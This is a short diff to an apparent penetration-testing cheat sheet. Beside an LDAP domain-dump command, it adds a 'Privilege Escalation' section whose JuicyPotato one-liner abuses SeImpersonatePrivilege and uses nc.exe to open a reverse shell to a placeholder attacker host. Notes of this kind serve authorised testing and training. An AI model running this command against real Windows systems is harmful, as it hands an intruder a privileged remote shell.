@@ -572,3 +572,9 @@ service apache2 start
 ```
 ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
 ```
+## Privilege Escalation
+
+SeImpersonatePrivilege (JuicyPotato.exe)
+```
+.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Users\tolis\Desktop\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
+```
